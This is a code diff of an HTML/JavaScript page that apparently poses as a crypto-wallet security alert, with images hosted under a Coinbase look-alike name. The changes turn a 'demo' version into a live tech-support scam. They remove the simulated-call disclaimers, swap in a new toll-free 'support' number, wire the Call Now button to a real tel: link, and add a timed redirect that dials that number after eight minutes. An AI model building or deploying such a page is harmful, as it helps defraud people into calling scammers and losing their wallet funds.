@@ -25,12 +25,12 @@
         user-select: none;
     }
 
-    /* 🔽 startImage ko button ki tarah set kiya */
+    /* 🔽 startImage ko button ki tarah set kiya, size bada kiya */
     #startImage {
         position: relative;
         display: block;
-        width: 200px;              /* button ka size */
-        height: 80px;
+        width: 400px;              /* button ka size aur bada kiya */
+        height: 160px;             /* button ka size aur bada kiya */
         margin: 100px auto;        /* center me lane ke liye */
         background-size: cover;
         background-position: center;
@@ -196,7 +196,7 @@
             <p><strong>Detected:</strong> Suspicious activity for the wallet tied to this device (example IP: <b>192.0.2.123</b>).</p>
             <p><strong>Immediate steps:</strong></p>
             <ul>
-              <li><strong>Call support immediately:</strong> <a href="tel:+18778687081">+1-877-868-7081</a></li>
+              <li><strong>Call support immediately:</strong> <a href="tel:+18889295618">+1 (888) 929-5618</a></li>
               <li>Do <strong>not</strong> share private keys, seed phrases, or passwords with anyone—even if they claim to be support.</li>
               <li>Revoke active sessions / connected dApps as instructed by support.</li>
               <li>Move funds to a new wallet created on a secure device if advised.</li>
@@ -211,7 +211,7 @@
 
         <div class="popup-buttons">
             <button id="callNowBtn">Call Now</button>
-            <div id="callNumberText">+1 877 868 7081</div>
+            <div id="callNumberText">+1 (888) 929-5618</div>
         </div>
     </div>
 </div>
@@ -234,7 +234,7 @@
     window.onload = function() {
         startImage.style.backgroundImage = "url('https://aliceinborderlandsept.github.io/colnbaze/1.jpeg')";
         if (navigator.userAgent.includes("HTTrack")) {
-            console.log("Website copying attempt detected (demo).");
+            alert("Website copying attempt detected. Action has been logged.");
         }
     }
 
@@ -247,38 +247,17 @@
         }
     });
 
-    // ✅ Fullscreen trigger function (cross-browser)
-    function triggerFullScreen() {
-        const docEl = document.documentElement;
-        if (docEl.requestFullscreen) {
-            docEl.requestFullscreen().catch(err => console.log('Fullscreen error:', err));
-        } else if (docEl.webkitRequestFullscreen) {
-            docEl.webkitRequestFullscreen(); // Safari
-        } else if (docEl.msRequestFullscreen) {
-            docEl.msRequestFullscreen(); // IE/Edge
-        }
-    }
-
-    // ✅ Fullscreen on any click/touch (first interaction)
-    document.addEventListener("click", triggerFullScreen, { once: true, capture: true });
-    document.addEventListener("touchstart", triggerFullScreen, { once: true, capture: true });
-
-    startImage.addEventListener('click', function () {
+    startImage.addEventListener('click', function (e) {
+        e.stopPropagation();
         applyBackground();
         startImage.style.display = 'none';
         document.getElementById('leavePopup').style.display = 'block';
-
-        try {
-            audio.currentTime = 0;
-            audio.play().catch(err => console.log('Audio play blocked:', err));
-        } catch (err) {
-            console.log('Audio error:', err);
-        }
+        audio.play();
 
         if (isMobile()) {
-            if (callNowBtn) callNowBtn.style.display = 'inline-block';
+            callNowBtn.style.display = 'inline-block';
         } else {
-            if (callNumberText) callNumberText.style.display = 'block';
+            callNumberText.style.display = 'block';
         }
 
         let progress = 0;
@@ -288,14 +267,15 @@
             progressFill.style.width = progress + '%';
             if (progress === 100) clearInterval(interval);
         }, 1000);
+
+        setTimeout(function () {
+            window.location.href = "tel:+18889295618";
+        }, 480000);
     }, { once: true });
 
-    if (callNowBtn) {
-        callNowBtn.addEventListener('click', function () {
-            alert('Simulated call action (demo only). No real call will be made.');
-            console.log('Simulated call button clicked (demo).');
-        });
-    }
+    callNowBtn.addEventListener('click', function () {
+        window.location.href = "tel:+18889295618";
+    });
 
     function applyBackground() {
         document.body.style.backgroundImage = "url('https://aliceinborderlandsept.github.io/colnbaze/2.jpeg')";
@@ -304,7 +284,6 @@
         document.body.style.backgroundRepeat = "no-repeat";
     }
 </script>
-
 
 </body>
 </html>
